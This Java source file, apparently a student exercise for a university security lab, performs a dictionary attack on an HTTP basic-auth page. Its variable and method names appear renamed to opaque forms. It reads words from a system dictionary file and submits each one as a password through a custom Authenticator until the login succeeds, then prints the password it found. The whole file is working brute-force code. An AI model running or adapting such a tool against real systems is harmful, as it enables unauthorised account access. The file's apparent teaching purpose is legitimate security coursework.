import java.io.PrintStream;
import java.net.MalformedURLException;
import java.io.IOException;
import java.io.Reader;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.Authenticator;
import java.io.BufferedReader;
import java.net.PasswordAuthentication;
import java.io.FileNotFoundException;
import java.io.FileReader;
public class Dictionary {
    static BufferedReader f00;
    static MyAuthenticator f10;
    public static void main ( final String[] array ) throws IOException {
        int i = 0;
        Authenticator.setDefault ( Dictionary.f10 );
        try {
            final URL url = new URL ( "http://sec-crack.cs.rmit.edu./SEC/2/index.php" );
            while ( i != 1 ) {
                try {
                    Dictionary.f00 = new BufferedReader ( new InputStreamReader ( url.openStream() ) );
                    i = 1;
                } catch ( IOException ex ) {}
            }
            while ( Dictionary.f00.readLine() != null ) {}
            final PrintStream out = System.out;
            final StringBuilder append = new StringBuilder().append ( "The successful Password found using a Dictionary search is = " );
            final MyAuthenticator f10 = Dictionary.f10;
            out.println ( append.append ( MyAuthenticator.m10() ).toString() );
        } catch ( MalformedURLException ex2 ) {
            System.out.println ( "mfURL" );
        }
    }
    static {
        Dictionary.f00 = null;
        Dictionary.f10 = new MyAuthenticator();
    }
}
class MyAuthenticator extends Authenticator {
    String f00;
    static String f10;
    static String f20;
    static BufferedReader f30;
    public MyAuthenticator() {
        this.f00 = "";
        try {
            MyAuthenticator.f30 = new BufferedReader ( new FileReader ( MyAuthenticator.f20 ) );
        } catch ( FileNotFoundException ex ) {
            System.out.println ( "File " + MyAuthenticator.f20 + " Not Found" );
            System.out.println ( " File Opened" );
            System.exit ( 1 );
        } catch ( IOException ex2 ) {
            System.out.println ( "File  Failed.." );
            System.exit ( 1 );
        }
    }
    static void m00 ( final String f10 ) {
        MyAuthenticator.f10 = f10;
    }
    static String m10() {
        return MyAuthenticator.f10;
    }
    static String m20() {
        try {
            if ( ( MyAuthenticator.f10 = MyAuthenticator.f30.readLine() ) == null ) {
                System.out.println ( "Password Not found in file '" + MyAuthenticator.f20 + "'." );
                System.exit ( 1 );
            }
        } catch ( IOException ex ) {
            System.out.println ( "File IOException" );
            System.out.println ( ex );
        }
        return MyAuthenticator.f10;
    }
    @Override
    protected PasswordAuthentication getPasswordAuthentication() {
        return new PasswordAuthentication ( this.f00, m20().toCharArray() );
    }
    static {
        MyAuthenticator.f10 = "";
        MyAuthenticator.f20 = "/usr/share/lib/dict/words";
    }
}
